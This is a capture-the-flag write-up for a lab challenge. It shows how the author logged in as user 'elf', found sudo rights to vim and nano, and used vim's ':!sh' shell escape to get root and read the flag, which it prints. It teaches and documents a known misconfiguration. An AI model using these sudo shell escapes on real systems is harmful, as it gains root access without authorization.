# Escape from Santa House (exploit) (author: snn)

## Tools

No special tools needed, just an ssh client and nowadays one is already installed on both Kali Linux and Windows. Enthusiasts could also use PuTTy or OpenSSH :)

## Description

```shell
Santa locked some elves in his house. Help them and get the flag in /root folder and escape.

Use elf with Christmas2023 password for ssh connection.
```

## Task analysis & solution

We have these details and hints provided to us from the get go:

- user: **`elf`**
- password: **`Christmas2023`**
- the docker instance to connect to, which always has an address of 10.10.8.61 and an everchanging port

- A hint that the flag is in the **`/root`** folder

First thing is to connect with the given details:

```shell
ssh 10.10.8.61 -p <port> -l elf   
elf@10.10.8.61's password: 
```

```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Dec 20 20:11:26 2023 from 10.4.24.67
$
```

When I connected, I decided to take a look arround. Let's see who we are and what our home directory is:

```shell
$ pwd && whoami
/home/elf
elf
```

Nothing special there. Let's try to find some hidden items:

```shell
$ ls -a
.  ..  .cache  .local
```

Let's try to look deeper..

```shell
$ find .
./.local
./.local/share
./.local/share/nano
./.cache
./.cache/motd.legal-displayed
```

No files and no hidden data, let's try go as super user:
```shell
$ sudo find .
[sudo] password for elf: 
Sorry, user elf is not allowed to execute '/usr/bin/find .' as root on 7546eb54b93f.

$ sudo su -
[sudo] password for elf: 
Sorry, user elf is not allowed to execute '/usr/bin/su -' as root on 7546eb54b93f.
```

At this point, I needed to see what our user ***`elf`*** can actually do:

```shell
$ sudo -l
[sudo] password for elf: 
Matching Defaults entries for elf on 7546eb54b93f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User elf may run the following commands on 7546eb54b93f:
    (root) /usr/bin/vim
    (root) /usr/bin/nano
```

From the output above, we can see that we can run two programs with root access:
- nano
- vim

This is very promising! Both tools are editors and they can read files in root folder. Even better - since they have ***`root`*** access they can execute commands and even fancier - fire up a shell. We already know that the flag is hidden somewhere in the /root folder.

A quick search on the web tells us how ***`nano`*** and ***`vim`*** can browse folders and execute commands.

- for ***`vim`*** you can open shell by entering this command ***`:!sh`***
- for ***`nano`*** CTRL+T execute commands and prints their results in the editor

I decided to go with ***`vim`***:

```shell
# pwd && whoami
/home/elf
root
```

Now I'm 'gROOT' (:-)) and I and can do anything I want :-) Let's open the root folder, search and grab the flag.

```shell
# cd /root
# ls -a
.  ..  .bash_history  .bashrc  .local  .profile  .vim  .viminfo  flagishere.txt
# cat flagishere.txt
MilestoneCTF{security-misconfigurations-make-Santa-sad}
```

There are other ways if you like working in ***`vim`***, but I hate that app :-)

The flag is **MilestoneCTF{security-misconfigurations-make-Santa-sad}**


